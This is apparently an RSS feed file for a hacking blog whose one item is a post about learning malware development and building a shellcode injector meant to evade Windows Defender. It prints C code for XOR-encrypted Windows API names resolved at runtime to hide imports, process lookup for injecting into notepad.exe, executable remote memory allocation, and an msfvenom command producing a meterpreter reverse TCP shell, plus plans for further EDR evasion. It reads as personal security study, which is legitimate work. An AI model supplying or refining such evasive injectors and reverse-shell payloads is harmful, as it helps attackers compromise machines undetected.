@@ -1,0 +1,178 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
+  <channel>
+    <title>Python on purpurina - A place for hacking</title>
+    <link>http://localhost:1313/tags/python/</link>
+    <description>Recent content in Python on purpurina - A place for hacking</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>made by jaco with love</copyright>
+    <lastBuildDate>Wed, 28 Feb 2024 20:53:30 +0100</lastBuildDate><atom:link href="http://localhost:1313/tags/python/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.jpg</icon>
+    
+    
+    <item>
+      <title>My first steps in MalDev</title>
+      <link>http://localhost:1313/posts/firststeps/</link>
+      <pubDate>Wed, 28 Feb 2024 20:53:30 +0100</pubDate>
+      
+      <guid>http://localhost:1313/posts/firststeps/</guid>
+      <description><![CDATA[<h2 id="prelude">Prelude</h2>
+<p>Around this last month I have been digging into the Malware Development world. I have always wanted to expand my knowledge within this field, and I felt like it was the moment to do so.</p>
+<p>As mentioned in many other blogposts, <a href="https://www.google.com/search?client=firefox-b-d&amp;q=sektor7+malware+development">Sektor7 Malware Development Essentials</a> course was a good point to start. Nevertheless, I found this course very short and I felt like most of the important concepts are ignored (e.g., <strong>what is a handle?</strong>) and are just used like if I already know them.</p>
+<p>Because of that, I actually recommend <strong>take a little stop on each of the things that the course shows you in order to UNDERSTAND what does each line do</strong> and also do some personal research on each of the things that the course provides.</p>
+<p>I personally made questions like:</p>
+<ul>
+<li>What are the parameters of this function?</li>
+<li>Why is this function called in the code?</li>
+<li>How could I develop this in a way that it could be more stealthy?</li>
+<li>What are these compile options?</li>
+</ul>
+<p>I wanted to make sure that I really learnt from this course and compiling and execute the code they give you is not the way to do it. I personally recommend to watch their videos, take some notes, and reproduce and execute the code in your personal project files. <strong>Do not be scared to improve or modify the code they give you if you think that can be useful.</strong></p>
+<p>The result of following these steps was a final course project in which I included all of the techniques given in the course to avoid detection (mainly static detection, it is a basic course) <strong>combined with am extra technique that made me bypass Windows Defender sandbox analysis.</strong></p>
+<p>Please note that I have just started to learn about these things and that I can be wrong; feel free to contact me at any of my social media to improve the quality of this post and my content overall.</p>
+<h2 id="evasive-loaderinjector">Evasive? loader/injector</h2>
+<p>The final project consists on a <strong>shellcode loader/injector (let&rsquo;s use injector from now on)</strong>.
+This shellcode injector <strong>is able to bypass Windows Defender with a meterpreter x64 shellcode at the day of this post (2024/03/05) with Cloud Protection enabled.</strong></p>
+<p><strong>EDIT</strong>: A week after this post was created, the dropper is not anymore evasive and is detected (dinamically) by Defender. I personally thought that this dropper is not stealthy enough to be evasive and a lot of evasive measures can (and will) be added to this dropper in the future. This has just started :P</p>
+<p>This injector has the following properties:</p>
+<ul>
+<li>It is an executable (.EXE) program. No DLL version for now.</li>
+<li>The shellcode is stored as a resource AND &ldquo;encrypted&rdquo; using XOR.</li>
+<li>The Windows API calls are calculated in run-time using the <a href="https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking">Run-Time Dynamic Linking</a> technique. This corresponds to the <a href="https://unprotect.it/technique/api-obfuscation/">API obfuscation technique</a> from my fellas of Unprotect Project.</li>
+<li>The strings to calculate the pointer to the API functions using the aforementioned technique are also encrypted with the same XOR key used for the shellcode, in order to obfuscate the strings.</li>
+<li>The XOR key is also stored as a resource in the executable.</li>
+<li>The program in which it injects into is <code>notepad.exe</code>. The injector obtains the PID given the process name and uses the PID to inject into.</li>
+<li>The program is compiled as a <strong>Windows Subsystem program</strong>, and not as a console program, in order to avoid a CMD popping on screen when the dropper gets executed.</li>
+</ul>
+<p>The API calls performed in this executable are simple:</p>
+<ul>
+<li><code>FindResource</code> and <code>LoadResource</code> to obtain the embedded resources in the executable.</li>
+<li><code>VirtualAlloc</code>, <code>RtlMoveMemory</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>VirtualProtectEx</code> and <code>CreateRemoteThread</code> for the injection technique.</li>
+<li><code>GetProcAddress</code> and <code>GetModuleHandle</code> to perform the IAT hiding technique.</li>
+<li><code>CreateToolhelp32Snapshot</code>, <code>Process32First</code> and <code>Process32Next</code> to obtain the PID given a process name.</li>
+</ul>
+<p>The injector has the following phases:</p>
+<ul>
+<li>It starts obtaining the XOR key from the resources section of the file.</li>
+<li>Using this key to decrypt the string names of the API calls, uses the relevant API functions to obtain the PID from the process name specified as a variable. The process name is hardcoded into the program <strong>as a real malware would do; otherwise, we would need to call this dropper with arguments (not a real case most of the time).</strong> Notepad.exe was used as an example, but it could be performed with more common processes as explorer.exe. Just modify the process name variable inside the dropper.</li>
+<li>The dropper allocates memory in <strong>its own process space and stores the shellcode embedded as a resource in this memory region. Note that the shellcode is stored in this region but not executed, as this is an intermediate step to then move the shellcode to the target process.</strong></li>
+<li>Using this obtained PID, the injector opens a handle to the process with the given PID and allocates memory space within the process region. The shellcode is then moved from the region that was previously created to this region.</li>
+<li>A remote thread pointing to the remote memory region containing the shellcode is started.</li>
+</ul>
+<p>The result is a thread in the remote process executing our shellcode.</p>
+<h2 id="finding-pid-given-process-name">Finding PID given process name</h2>
+<p>The used Windows API functions to perform the process injection technique require the PID of the process to inject into. A function that dinamically obtains the PID of a given process name at runtime was implemented in the injector using some of the Windows API calls.</p>
+<p>The function is the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">findMyProc</span>(<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span> procname) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HANDLE hSnapshot; <span style="color:#75715e">// Handle to the system process snapshot.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	PROCESSENTRY32 pe;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	BOOL hResult;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Searching for the process %ls to get its PID...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, procname);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// snapshot of all processes in the system
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> CreateToolhelp32SnapshotEncrypted[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x2A</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x6D</span>, <span style="color:#ae81ff">0xBE</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0xCB</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0xBA</span>, <span style="color:#ae81ff">0xCF</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x3B</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0xA2</span>, <span style="color:#ae81ff">0xB3</span> };
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">XOR</span>(CreateToolhelp32SnapshotEncrypted, <span style="color:#66d9ef">sizeof</span>(CreateToolhelp32SnapshotEncrypted), key, key_len);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">auto</span> <span style="color:#66d9ef">const</span> pCreateToolhelp32Snapshot <span style="color:#f92672">=</span> reinterpret_cast<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">LPVOID</span>(WINAPI<span style="color:#f92672">*</span>)(DWORD dwFlags, DWORD th32ProcessID)<span style="color:#f92672">&gt;</span>(
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">GetProcAddress</span>(hKernel32, (LPCSTR)CreateToolhelp32SnapshotEncrypted)
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span>	hSnapshot <span style="color:#f92672">=</span> <span style="color:#a6e22e">pCreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hSnapshot <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// It is neccesary to initialize the size of the process entry.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">/* Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32). If you do not initialize dwSize,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	Process32First fails (https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) */</span>
+</span></span><span style="display:flex;"><span>	pe.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32W);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Retrieve infrormation about first process encountered in a system snapshot
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> Process32FirstWEncrypted[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xA1</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x7B</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xD9</span>, <span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xF6</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xFC</span>, <span style="color:#ae81ff">0x88</span> };
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">XOR</span>(Process32FirstWEncrypted, <span style="color:#66d9ef">sizeof</span>(Process32FirstWEncrypted), key, key_len);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">auto</span> <span style="color:#66d9ef">const</span> pProcess32FirstW <span style="color:#f92672">=</span> reinterpret_cast<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">BOOL</span>(WINAPI<span style="color:#f92672">*</span>)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)<span style="color:#f92672">&gt;</span>(
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">GetProcAddress</span>(hKernel32, (LPCSTR)Process32FirstWEncrypted)
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span>	hResult <span style="color:#f92672">=</span> <span style="color:#a6e22e">pProcess32FirstW</span>(hSnapshot, <span style="color:#f92672">&amp;</span>pe);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Get information about the obtained process using its handle
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// and exit if unsuccessful
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> Process32NextWEncrypted[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xA1</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x7B</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0xFC</span>, <span style="color:#ae81ff">0x7E</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0xAB</span> };
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">XOR</span>(Process32NextWEncrypted, <span style="color:#66d9ef">sizeof</span>(Process32NextWEncrypted), key, key_len);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">auto</span> <span style="color:#66d9ef">const</span> pProcess32NextW <span style="color:#f92672">=</span> reinterpret_cast<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">BOOL</span>(WINAPI<span style="color:#f92672">*</span>)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)<span style="color:#f92672">&gt;</span>(
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">GetProcAddress</span>(hKernel32, (LPCSTR)Process32NextWEncrypted)
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">pProcess32NextW</span>(hSnapshot, <span style="color:#f92672">&amp;</span>pe)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">lstrcmpW</span>(pe.szExeFile, procname) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>			pid <span style="color:#f92672">=</span> pe.th32ProcessID;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Close the open handle; we don&#39;t need it anymore
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">CloseHandle</span>(hSnapshot);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> pid;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Note that this function <strong>will return the first PID occurrence related to the process specified; if there are two process called notepad.exe, it will return the first one that is found in the snapshot obtained calling <code>CreateToolhelp32Snapshot</code></strong> (a lot of factors influence in the first returned PID).</p>
+<h2 id="evasion-techniques">Evasion techniques</h2>
+<p>Here is a detailed overview of each of the things I implemented in the program to make it stealthier, both statically and dinamically. Overall, I think that it is missing a lot of evasion techniques but as I repeated before, I am just learning slowly to know what I am exactly doing without copypasting.</p>
+<h3 id="windows-subsystem">Windows Subsystem</h3>
+<p>The program is compiled specifying <code>WINDOWS</code> as the subsystem and not <code>CONSOLE</code> as the subsystem in order to avoid the OS allocating a console when the file is executed.
+In order to do this, we first need to compile the file specifying <code>WINDOWS</code> as the <code>SUBSYSTEM</code> FLAG:</p>
+<p><img src="/images/post_images/firststeps_1.png" alt=""></p>
+<p>After that, the linker will not search for the main function; instead, it will search for the following function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> WINAPI <span style="color:#a6e22e">WinMain</span>(HINSTANCE,HISTANCE,LPSTR,<span style="color:#66d9ef">int</span>);
+</span></span></code></pre></div><p>Therefore we must replace our main function with WinMain:
+<img src="/images/post_images/firststeps_2.png" alt=""></p>
+<h3 id="iat-hiding--encrypted-strings">IAT hiding + encrypted strings</h3>
+<p>The API calls are resolved dinamically, therefore, not appearing in the IAT of the file.
+Let&rsquo;s see the snippet of the code to obfuscate an API call:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// VirtualAllocEx\0 char array encrypted with the XOR key
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> VirtualAllocExEncrypted[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x3F</span>, <span style="color:#ae81ff">0xDF</span>, <span style="color:#ae81ff">0xBC</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0xE7</span>, <span style="color:#ae81ff">0x4F</span>, <span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0xAB</span> };
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Decrypting the string
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">XOR</span>(VirtualAllocExEncrypted, <span style="color:#66d9ef">sizeof</span>(VirtualAllocExEncrypted), key, key_len);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Obtaining the pointer to the VirtualAllocEx function at runtime
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">auto</span> <span style="color:#66d9ef">const</span> pVirtualAllocEx <span style="color:#f92672">=</span> reinterpret_cast<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">LPVOID</span>(WINAPI<span style="color:#f92672">*</span>)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)<span style="color:#f92672">&gt;</span>(
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">GetProcAddress</span>(<span style="color:#a6e22e">GetModuleHandle</span>(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>), (LPCSTR)VirtualAllocExEncrypted)
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Calling the function using the pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	lpBufferAddress <span style="color:#f92672">=</span> <span style="color:#a6e22e">pVirtualAllocEx</span>(hOpenProcess, NULL, shellcode_len, (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+</span></span></code></pre></div><p>The string is encrypted to not use GetProcAddress and insert the hardcoded &ldquo;<code>VirtualAllocEx</code>&rdquo; function name. <strong>This would result in the function name appearing as a string in the file.</strong>
+Given this technique, PE analyzers do not display any information about these calls in the IAT nor in the strings. We can see an example with PExplorer, in which none of the used imports is being shown in the IAT:</p>
+<p><img src="/images/post_images/firststeps.png" alt=""></p>
+<p>Also, strings related to these calls do not appear in the <code>strings</code> section:</p>
+<p><img src="/images/post_images/firststeps_3.png" alt=""></p>
+<h2 id="analyzing-the-loader-with-threatcheck">Analyzing the loader with ThreatCheck</h2>
+<p><a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a> is an interesting tool designed by RastaMouse that allows us to <strong>pinpoint the exact bytes that Windows Defender will flag</strong> when scanning the file.</p>
+<p>We can use this tool with our loader to verify if Defender flags our file:
+<img src="/images/post_images/firststeps_5.png" alt=""></p>
+<p>We can see that at first sight Defender does not seem to detect our loader.</p>
+<h2 id="used-shellcode">Used shellcode</h2>
+<p>The used shellcode is generated from <code>msfvenom</code> and it is a meterpreter reverse TCP shell. The shellcode used is <strong>staged</strong> and that means that it is lighter, but there is a download of the rest of the shellcode after the initial shellcode has been executed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.0.143 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f raw -o meterpreter EXITFUNC<span style="color:#f92672">=</span>thread
+</span></span></code></pre></div><h2 id="defender-bypass-poc">Defender Bypass PoC</h2>
+<p>Here is a video using this injector to load the previous shellcode with Defender on. Note that all of the functionalities of Defender are activated but the automatic sample submission (for obvious reasons):</p>
+<p><code><video class="video-shortcode" preload="auto" width="100%" controls>
+  <source src="/images/post_videos/firststeps_poc.webm" type="video/webm" >
+  There should have been a video here but your browser does not seem
+  to support it.
+</video></code></p>
+<p>We can see that no console is being displayed and that it looks stealthy.</p>
+<h2 id="future-research-areas">Future research areas</h2>
+<p>This post is just the start of a big project I have in hand. The main objective of my project is to understand how OS (specially Windows) works, and how EDR solutions work, in order to understand the most advanced EDR evasion techniques and how can I implement my own techniques to evade EDR using the OS facilities.</p>
+<p>I will update this injector when I discover more techniques, but here are some of the possible upgrade areas:</p>
+<ul>
+<li>Change the injected shellcode for a custom one (IMHO I am far far away from developing a custom shellcode, but I am sure I will do it at the end)</li>
+<li>Change the encryption algorithm used to a stronger one (RC6, for example).</li>
+<li>Develop the injector in another language (C#, go, nim&hellip;).</li>
+<li>Obtain the key to decrypt the resources from a server; this way, without proper connection to the server the injected shellcode does not work (ideal for EDRs that have a offline sandbox environment).</li>
+<li>Overall, use more advanced evasion techniques (indirect syscalls, for example).</li>
+</ul>
+<p>I will start soon Sektor7 Malware Development Intermediate course and start reading Windows Internals book, to complement my knowledge.</p>
+<p>I hope you liked reading my post, feel free to contact me at any of my socials for any question/aclaration or just to give me tips, and I hope we see each other soon!</p>
+<p><em><strong>jasco</strong></em></p>
+]]></description>
+      
+    </item>
+    
+    
+  </channel>
+</rss>
